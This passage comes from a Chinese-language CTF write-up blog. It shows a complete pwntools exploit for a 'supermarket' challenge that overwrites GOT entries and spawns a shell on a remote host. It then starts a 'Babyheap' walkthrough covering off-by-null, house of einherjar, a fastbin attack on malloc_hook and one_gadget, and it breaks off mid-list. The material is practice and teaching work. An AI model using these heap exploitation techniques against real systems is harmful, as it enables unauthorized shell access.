<h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><br><span class="hljs-comment"># Author: I0gan</span><br><span class="hljs-comment"># Team  : D0g3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import LibcSearcher</span><br><br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br><span class="hljs-comment">#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]</span><br><span class="hljs-comment">#context.terminal = &#x27;konsole&#x27;</span><br><br><span class="hljs-comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><br>exeFile  = <span class="hljs-string">&quot;supermarket&quot;</span><br>libFile  = <span class="hljs-string">&quot;libc.so.6&quot;</span><br><br>remoteIp = <span class="hljs-string">&quot;111.198.29.45&quot;</span><br>remotePort = <span class="hljs-number">57966</span><br><br>LOCAL = <span class="hljs-number">0</span><br>LIBC  = <span class="hljs-number">1</span><br><br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>pd32  = <span class="hljs-keyword">lambda</span> x : p32(x).decode() <span class="hljs-comment">#python3 not surport str + bytes</span><br>pd64  = <span class="hljs-keyword">lambda</span> x : p64(x).decode()<br>li    = <span class="hljs-keyword">lambda</span> x : log.info(x)<br>db    = <span class="hljs-keyword">lambda</span>   : gdb.attach(io)<br><br><span class="hljs-comment">#--------------------------Func-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ad</span>(<span class="hljs-params">index, size, text</span>):<br>	sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>))<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, text)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rm</span>(<span class="hljs-params">index</span>):<br>	sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dp</span>():<br>	sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md</span>(<span class="hljs-params">index, size, text</span>):<br>	sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">5</span>))<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, text)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">q</span>():<br>	sa(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">6</span>))<br><br><span class="hljs-comment">#--------------------------Exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>	ad(<span class="hljs-number">0</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;0&#x27;</span> * (<span class="hljs-number">0x80</span> - <span class="hljs-number">1</span>))<br>	ad(<span class="hljs-number">1</span>, <span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;1&#x27;</span> * (<span class="hljs-number">0x10</span> - <span class="hljs-number">1</span>))<br>	md(<span class="hljs-number">0</span>, <span class="hljs-number">0x90</span>, <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-comment">#不要向free掉的数据块中写入数据. 不然后期无法malloc</span><br>	ad(<span class="hljs-number">2</span>, <span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;2&#x27;</span> * (<span class="hljs-number">0x10</span> - <span class="hljs-number">1</span>))<br>	p = p32(<span class="hljs-number">0x32</span>) + p32(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span><br>	p += p32(<span class="hljs-number">0x10</span>) + p32(exe.got[<span class="hljs-string">&#x27;free&#x27;</span>])<br>	p += <span class="hljs-string">&#x27;\x19&#x27;</span><br>	md(<span class="hljs-number">0</span>, <span class="hljs-number">0x80</span>, p) <span class="hljs-comment"># modify dscription addr as free got addr</span><br>	p2 = p32(exe.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>	md(<span class="hljs-number">2</span>, <span class="hljs-number">0x10</span>, p2) <span class="hljs-comment">#modify free got addr as puts got addr</span><br><br>	<span class="hljs-comment"># leaking</span><br>	p3 = p32(<span class="hljs-number">0x32</span>) + p32(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span><br>	p3 += p32(<span class="hljs-number">0x10</span>) + p32(exe.got[<span class="hljs-string">&#x27;atoi&#x27;</span>])<br>	p3 += <span class="hljs-string">&#x27;\x19&#x27;</span><br>	md(<span class="hljs-number">0</span>, <span class="hljs-number">0x80</span>, p3)<br><br>	rm(<span class="hljs-number">2</span>) <span class="hljs-comment">#puts atoi addr in libc</span><br>	atoi_addr = u32(r(<span class="hljs-number">4</span>))<br>	li(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(atoi_addr))<br>	libc_base = atoi_addr - lib.sym[<span class="hljs-string">&#x27;atoi&#x27;</span>]<br>	li(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>	sys_addr = libc_base + lib.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>	sh_addr = libc_base + <span class="hljs-number">0x0015902b</span><br><br>	<span class="hljs-comment">#modify got addr as system</span><br>	ad(<span class="hljs-number">3</span>, <span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;3&#x27;</span> * (<span class="hljs-number">0x10</span> - <span class="hljs-number">1</span>))<br><br>	p4 = p32(<span class="hljs-number">0x32</span>) + p32(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span><br>	p4 += p32(<span class="hljs-number">0x10</span>) + p32(<span class="hljs-number">0x0</span>)<br>	p4 += p32(<span class="hljs-number">0x19</span>) + p32(<span class="hljs-number">0x0</span>) * <span class="hljs-number">5</span><br><br>	p4 += p32(<span class="hljs-number">0x21</span>) <span class="hljs-comment"># modify item 3</span><br><br>	p4 += p32(<span class="hljs-number">0x33</span>) <span class="hljs-comment">#3</span><br>	p4 += p32(<span class="hljs-number">0x0</span>) * <span class="hljs-number">4</span><br>	p4 += p32(<span class="hljs-number">0x10</span>)<br>	p4 += p32(exe.got[<span class="hljs-string">&#x27;atoi&#x27;</span>]) + <span class="hljs-string">&#x27;\x19&#x27;</span><br><br>	md(<span class="hljs-number">0</span>, <span class="hljs-number">0x80</span>, p4)<br><br><br>	p5 = p32(sys_addr)<br>	md(<span class="hljs-number">3</span>, <span class="hljs-number">0x10</span>, p5) <span class="hljs-comment"># modify atoi got table as system</span><br><br>	<span class="hljs-comment">#db()</span><br><br>	<span class="hljs-comment"># call system with /bin/sh</span><br>	sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>	ia()<br>	c()<br><br><span class="hljs-comment">#--------------------------Main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><br>	exe = ELF(exeFile)<br>	<span class="hljs-keyword">if</span> LOCAL:<br>		<span class="hljs-keyword">if</span> LIBC:<br>			lib = ELF(<span class="hljs-string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)<br>		<span class="hljs-comment">#io = exe.process(env = &#123;&quot;LD_PRELOAD&quot; : libFile&#125;)</span><br>		io = exe.process()<br><br>	<span class="hljs-keyword">else</span>:<br>		io = remote(remoteIp, remotePort)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			lib = ELF(libFile)<br><br>	exploit()<br>	finish()<br></code></pre></td></tr></table></figure>



<h1 id="Babyheap"><a href="#Babyheap" class="headerlink" title="Babyheap"></a>Babyheap</h1><h2 id="来源-2"><a href="#来源-2" class="headerlink" title="来源"></a>来源</h2><p>World of Attack &amp; Defense</p>
<h2 id="难度-1"><a href="#难度-1" class="headerlink" title="难度"></a>难度</h2><p>6 &#x2F; 10</p>
<h2 id="保护-2"><a href="#保护-2" class="headerlink" title="保护"></a>保护</h2> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Arch:     amd64-64-little<br>RELRO:    Full RELRO<br>Stack:    Canary found<br>NX:       NX enabled<br>PIE:      PIE enabled<br></code></pre></td></tr></table></figure>

<h2 id="简单描述-1"><a href="#简单描述-1" class="headerlink" title="简单描述"></a>简单描述</h2><p>只有4个功能, 添加,删除,查看,退出.保护全开,只有一个漏洞可以利用.</p>
<h2 id="vul-3"><a href="#vul-3" class="headerlink" title="vul"></a>vul</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">read_input</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">int</span> a2)</span><br>&#123;<br>  <span class="hljs-type">char</span> buf; <span class="hljs-comment">// [rsp+13h] [rbp-Dh]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v5 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; a2; ++i )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">signed</span> <span class="hljs-type">int</span>)read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">1uLL</span>) &lt; <span class="hljs-number">0</span> )<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Read error!\n&quot;</span>);<br>    <span class="hljs-keyword">if</span> ( buf == <span class="hljs-number">10</span> )<br>      <span class="hljs-keyword">break</span>;<br>    *(_BYTE *)(a1 + i) = buf;<br>  &#125;<br>  *(_BYTE *)(i + a1) = <span class="hljs-number">0</span>;                       <span class="hljs-comment">// off by null</span><br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v5;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>off by null 漏洞,还有一个是在free时,unsigned int与signed int的索引值,但利用不了…</p>
<h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><p>house of einherjar, off by one, unlink check, fastbin attack, realloc_hook to banance stack, one_gadget</p>
<h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><p>通过house of einherjar实现堆合并,然后通过unsorted bin特性分割堆块,打印获取main_arena + 88地址,通过fastbin attack 打入 malloc_hook - 0x23处,通过 malloc_hook来实现Onegaget,realloc_hook调整execve第二个参数</p>
<h2 id="利用-3"><a href="#利用-3" class="headerlink" title="利用"></a>利用</h2><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><br><span class="hljs-comment"># Author: I0gan</span><br><span class="hljs-comment"># Team  : D0g3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import LibcSearcher</span><br><br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br><span class="hljs-comment">#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]</span><br><span class="hljs-comment">#context.terminal = &#x27;konsole&#x27;</span><br><br><span class="hljs-comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>exeFile  = <span class="hljs-string">&quot;timu&quot;</span><br>libFile  = <span class="hljs-string">&quot;./libc.so.6&quot;</span><br>libFile  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br><br>remoteIp = <span class="hljs-string">&quot;0.0.0.0&quot;</span><br>remotePort = <span class="hljs-number">0</span><br><br>LOCAL = <span class="hljs-number">1</span><br>LIB   = <span class="hljs-number">1</span><br><br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>pd32  = <span class="hljs-keyword">lambda</span> x : p32(x).decode() <span class="hljs-comment">#python3 not surport str + bytes</span><br>pd64  = <span class="hljs-keyword">lambda</span> x : p64(x).decode()<br>li    = <span class="hljs-keyword">lambda</span> x : log.info(x)<br>db    = <span class="hljs-keyword">lambda</span>   : gdb.attach(io)<br><br><span class="hljs-comment">#--------------------------Func-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ad</span>(<span class="hljs-params">size, data</span>):<br>	sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>	sla(<span class="hljs-string">&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>	sa(<span class="hljs-string">&#x27;Data:&#x27;</span>, data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rm</span>(<span class="hljs-params">idx</span>):<br>	sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>	sla(<span class="hljs-string">&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dp</span>():<br>	sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br><br><span class="hljs-comment">#def q():</span><br><span class="hljs-comment">#	sla(&#x27;:&#x27;, str(5))</span><br></code></pre></td></tr></table></figure>



<h3 id="构造堆快布局"><a href="#构造堆快布局" class="headerlink" title="构造堆快布局"></a>构造堆快布局</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">ad(<span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x80</span>) <span class="hljs-comment"># idx 0 为了合并</span><br>ad(<span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;B&#x27;</span> * <span class="hljs-number">0x80</span>) <span class="hljs-comment"># idx 1 为了在合并后,然后分割堆快打印出main_arena</span><br>ad(<span class="hljs-number">0x68</span>, <span class="hljs-string">&#x27;C&#x27;</span> * <span class="hljs-number">0x68</span>) <span class="hljs-comment"># idx 2 为了可以利用fastbin attack 和 off by null</span><br>ad(<span class="hljs-number">0xF0</span>, <span class="hljs-string">&#x27;E\n&#x27;</span>) <span class="hljs-comment"># idx 3 为了使用house of einherjar 合并 chunk 0控制所有堆块</span><br>ad(<span class="hljs-number">0x68</span>, <span class="hljs-string">&#x27;F\n&#x27;</span>) <span class="hljs-comment">#为了防止top chunk 向前合并</span><br></code></pre></td></tr></table></figure>

<h3 id="使用house-of-einherjar-来合并-chunk-1"><a href="#使用house-of-einherjar-来合并-chunk-1" class="headerlink" title="使用house of einherjar 来合并 chunk 1"></a>使用house of einherjar 来合并 chunk 1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">rm(<span class="hljs-number">2</span>) <span class="hljs-comment">#为了使用 off by null 覆盖 chunk3 释放重新开辟</span><br><span class="hljs-comment"># use house of einherjar</span><br>p = <span class="hljs-string">&#x27;C&#x27;</span> * <span class="hljs-number">0x60</span><br>p += p64(<span class="hljs-number">0x190</span>) <span class="hljs-comment">#prev_size = chunk 0 addr - chunk 3 addr</span><br>ad(<span class="hljs-number">0x68</span>, p) <span class="hljs-comment">#使用 off by null 覆盖 chunk 3</span><br><br>rm(<span class="hljs-number">2</span>) <span class="hljs-comment">#先释放掉进入fastbin中, 后面只需通过溢出修改fd指向我们想要的地方</span><br><span class="hljs-comment"># 触发 house of eiherjar</span><br>   <span class="hljs-comment">#避免unlink检查, 先是放掉chunk 0, 这样 chunk0 的fd 和 bk指向的都是main_arena + 88,这样可以绕过unlink检查 FD-bk != P || BK-&gt;fd != p</span><br>rm(<span class="hljs-number">0</span>)<br>rm(<span class="hljs-number">3</span>)  <span class="hljs-comment">#合并到chunk 0</span><br></code></pre></td></tr></table></figure>

<h3 id="泄漏-main-arena-和libc基址"><a href="#泄漏-main-arena-和libc基址" class="headerlink" title="泄漏 main_arena 和libc基址"></a>泄漏 main_arena 和libc基址</h3><p>通过分割unsorted bin实现main_arena信息转移,通过开辟0x80内存后, main_arena信息会跑到chunk 1中, 由于我们还对chunk 1没有释放, 直接打印即可获取main_arena + 88 处地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># leak main_arena</span><br>ad(<span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">16</span> + <span class="hljs-string">&#x27;\n&#x27;</span>) <span class="hljs-comment">#分割 unsorted bin, main_arena 会出现在 chunk 1中</span><br>dp()<br>main_arena = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">5</span>:] + <span class="hljs-string">&#x27;\x7f\x00\x00&#x27;</span>) - <span class="hljs-number">0x58</span><br>libc_base = main_arena - <span class="hljs-number">0x3c4b20</span><br>li(<span class="hljs-string">&#x27;main_arena &#x27;</span> + <span class="hljs-built_in">hex</span>(main_arena))<br>li(<span class="hljs-string">&#x27;libc_base &#x27;</span> +  <span class="hljs-built_in">hex</span>(libc_base))<br></code></pre></td></tr></table></figure>

<h3 id="fastbin-attack打入-malloc-hook处"><a href="#fastbin-attack打入-malloc-hook处" class="headerlink" title="fastbin attack打入 malloc_hook处"></a>fastbin attack打入 malloc_hook处</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#通过开辟内存溢出掌控chunk 2, 在fastbin 中chunk 2是我们之前释放的, 现在只需要修改fd指向 malloc_hook -0x23处</span><br>   p = <span class="hljs-string">&#x27;\x00&#x27;</span> * <span class="hljs-number">0x80</span><br>p += p64(<span class="hljs-number">0</span>)<br>p += p64(<span class="hljs-number">0x71</span>)<br>p += p64(main_arena - <span class="hljs-number">0x33</span>)<br>p += <span class="hljs-string">&#x27;\n&#x27;</span><br>ad(<span class="hljs-number">0xA0</span>, p)<br><br>ad(<span class="hljs-number">0x68</span>, <span class="hljs-string">&#x27;\n&#x27;</span>) <span class="hljs-comment">#for ajust fastbin</span><br><br></code></pre></td></tr></table></figure>

<h3 id="修改malloc-hook"><a href="#修改malloc-hook" class="headerlink" title="修改malloc_hook"></a>修改malloc_hook</h3><p>由于直接修改malloc_hook为one_gadget,由于参数 [rsp + x] x 为0x30,0x50,0x70都不能使[rsp + x]为0,也就是说在执行execve的时候,第二个参数的内容没有满足为 0,所以不能触发get shell, 需要使用 realloc_hook来进行调整rsp的偏移,进而修改[rsp + x]满足为0,而在realloc_hook处,我们可以填写reallc的地址根据push来调整rsp的偏移,达到 [rsp + x]为0, 而在执行push完之后,就先进行判断 realloc_hook是否为0,若不为0,就先执行 realloc_hook处,这时我们就可以填写one_gadget 到realloc_hook处来打one_gadget</p>
<h4 id="realloc-hook反汇编"><a href="#realloc-hook反汇编" class="headerlink" title="realloc_hook反汇编"></a>realloc_hook反汇编</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">pwndbg&gt; disass 0x7fe7cb0ea6c0<br>Dump of assembler code for function __GI___libc_realloc:<br>   0x00007fe7cb0ea6c0 &lt;+0&gt;:	push   r15<br>   0x00007fe7cb0ea6c2 &lt;+2&gt;:	push   r14<br>   0x00007fe7cb0ea6c4 &lt;+4&gt;:	push   r13<br>   0x00007fe7cb0ea6c6 &lt;+6&gt;:	push   r12<br>   0x00007fe7cb0ea6c8 &lt;+8&gt;:	mov    r13,rsi<br>   0x00007fe7cb0ea6cb &lt;+11&gt;:	push   rbp<br>   0x00007fe7cb0ea6cc &lt;+12&gt;:	push   rbx<br>   0x00007fe7cb0ea6cd &lt;+13&gt;:	mov    rbx,rdi<br>   0x00007fe7cb0ea6d0 &lt;+16&gt;:	sub    rsp,0x38<br>   0x00007fe7cb0ea6d4 &lt;+20&gt;:	mov    rax,QWORD PTR [rip+0x33f8f5]        # 0x7fe7cb429fd0<br>   0x00007fe7cb0ea6db &lt;+27&gt;:	mov    rax,QWORD PTR [rax]<br>   0x00007fe7cb0ea6de &lt;+30&gt;:	test   rax,rax<br>   0x00007fe7cb0ea6e1 &lt;+33&gt;:	jne    0x7fe7cb0ea8e8 &lt;__GI___libc_realloc+552&gt;<br>   0x00007fe7cb0ea6e7 &lt;+39&gt;:	test   rsi,rsi<br>   0x00007fe7cb0ea6ea &lt;+42&gt;:	jne    0x7fe7cb0ea6f5 &lt;__GI___libc_realloc+53&gt;<br>   0x00007fe7cb0ea6ec &lt;+44&gt;:	test   rdi,rdi<br><br></code></pre></td></tr></table></figure>

<p>通过调试试出了两个one_gadget满足execve 第二个参数内容为0</p>
<ol>
<li>malloc_hook &#x3D; libc_base + 0x4526a, realloc_hook &#x3D; realloc_addr + 2</li>
